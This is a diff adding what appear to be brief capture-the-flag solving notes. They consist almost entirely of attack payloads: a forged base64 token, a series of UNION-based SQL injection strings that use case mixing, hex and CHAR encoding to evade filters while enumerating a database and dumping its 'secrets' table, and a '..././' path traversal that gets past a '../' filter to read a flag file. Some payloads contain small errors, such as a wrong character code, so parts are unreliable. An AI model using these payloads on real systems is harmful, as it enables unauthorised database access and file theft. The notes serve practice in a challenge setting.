@@ -1,0 +1,30 @@
+phase 1 : eyJ1c2VybmFtZSI6ImhhY2tlciIsImlzQWdlbnQiOjF9
+phase 2 => injection in password : UNION SELECT NULL, group_concat(table_name) FROM information_schema.tables  => 1%20UnIoN%20sElECT%20NULL,%20group_concat(table_name)%20FrOm%20information_schema.tables-- 
+          UnIon%20SelecT%20NULL,operation,status%20FroM%secrets
+
+Database name
+
+    username = admin" UNIon SELecT 1, 2, database() -- -
+Table names:
+    username = admin" UNIon SELecT 1, 2,table_name fRoM (SeLECT 0x696e666f726d6174696f6e5f736368656d61).tables WheRE table_schema IN ("zero_day") -- - 
+
+    username = admin" UNIon SELecT 1, 2,table_name fRoM (SELECT * FROM `0x696e666f726d6174696f6e5f736368656d61`.tables) AS t WheRE t.table_schema IN ("zero_day") -- - 
+    admin" UNIon SELecT 1, 2,(SeLECT 0x696e666f726d6174696f6e5f736368656d61)-- -
+    admin" UNIon SELecT 1, 2, (SELEct CHAR(105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110,95,15,115, 99, 104, 101, 109, 97,46, 116,97,98,108,101,115) ) -- -
+
+    username = admin" UNIon SELecT 1, 2,table_name fRoM (SELEct CHAR(105, 110, 102, 111, 114, 109, 97, 116, 105, 111, 110,95,15,115, 99, 104, 101, 109, 97,46, 116,97,98,108,101,115) ) WheRE table_schema IN ("zero_day") -- - 
+
+    admin" UNIon SELecT 1, 2, table_name frOM (SHOW TABLES IN zero_day) AS t -- -
+
+Column names
+    username = admin" UNIon SELecT 1, 2,column_name frOm information_schema.columns WherE table_name IN ("secrets") -- -
+    admin" UNIon SELecT 1, 2,column_name fRoM INFOrmation_schema.columns WheRE table_name IN ("secrets") -- - 
+Retrieve Data
+
+    admin" UNIon SELecT 1, 2,COncat(operation, status)  fRoM secrets -- - 
+
+
+phase 3 :  /secret_archive.php?page=./..././..././..././..././..././..././..././..././lotus/flag.txt
+
+the ./ to bypass ../ at the begining filter check
+and ..././ to get ../
